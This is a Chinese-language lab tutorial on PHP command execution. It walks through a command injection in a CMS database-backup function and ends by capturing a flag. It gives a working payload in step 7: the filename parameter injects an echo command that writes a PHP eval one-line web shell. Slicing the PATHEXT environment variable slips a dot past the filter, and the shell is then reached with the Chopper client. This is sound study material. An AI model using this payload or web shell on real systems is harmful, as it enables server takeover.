# Chapter 9.4 命令执行

## 0x00 原理

1. `system()`：PHP会操纵计算机执行批处理命令,且输出并返回结果
2. `echo exec()`：PHP会去操纵计算机执行批处理命令,且获取最后一行数据
3. `echo shell_exec（）`：PHP会去操纵计算机执行批处理命令,且获取所有数据
4. `passthru()`：只调用命令，把命令的运行结果原样地直接输出到标准输出设备
5. `echo 反引号 `：等同于shell_exec（）
6. `popen（命令,参数）`

## 0x01 漏洞复现

1. 本地搭建CMS，提取关键源码进行审计

	![](https://nc0.cdn.zkaq.cn/md/5371/f99324154e7c5bfbda49ff2e8cf1bf83_43486.png)
2. 发现源码被zend加密，使用解密软件解密

	![](https://nc0.cdn.zkaq.cn/md/5371/e3dc0e386496ecebc23ebb72c2b7a58c_70858.png)
	![](https://nc0.cdn.zkaq.cn/md/5371/fe0edbc638dbb90b8285b682beba9373_51871.png)
3. 审计代码，全局搜索`shell_exex`函数

	![](https://nc0.cdn.zkaq.cn/md/5371/bfed5fc0faf30dffc5a5451d7392ce09_25284.png)

4. 在Database.php中发现了危险函数，在此发现是备份文件的语句

	![](https://nc0.cdn.zkaq.cn/md/5371/535e1ec38c3a9dee538ee4e519b0dcd8_15076.png)
5. 追踪$dumpFile参数，发现系统执行备份.sql文件

	![](https://nc0.cdn.zkaq.cn/md/5371/539d146515894b9086b3b4147046d23f_68404.png)
6. 追踪$backupFileName变量，发现其由变量$filename决定且在此过滤了`. \ / '`。

	![](https://nc0.cdn.zkaq.cn/md/5371/0ab869dfd0da695b88f9bc8c3ddf7c5b_74067.png)
7. 追踪$filename变量，由request传参决定。想办法绕过过滤。

   1. %a:~0,6% //取出环境变量的值，从第0个位置开始，取6个值(切割环境变量)。

   2. %PATHEXT:~0,1%这样我们就可以切出.来绕过.的过滤。我们可以传参里写一句话文件。

      	`filename=test%26echo+”<?php eval($_REQUEST[2])?			>”>shell%PATHEXT:~0,1%php%26owe`

   3. $符号需要编码成%26，test是文件备份名，shell是生成的一句话木马名，后面的owe是跟后缀.sql组合。我们直接burp抓包更改包。

	![](https://nc0.cdn.zkaq.cn/md/5371/5534d479bdf25d184f5f1d95b4956f15_88441.png)
8. 放包后获得返回结果，phpinfo测试

	![](https://nc0.cdn.zkaq.cn/md/5371/2fc730b378041d0abcd537c36d1cbe2b_11932.png)
9. 连接菜刀，获得flag

	![](https://nc0.cdn.zkaq.cn/md/5371/906b67e12cc3f3b1cb75fadd8833db03_54118.png)

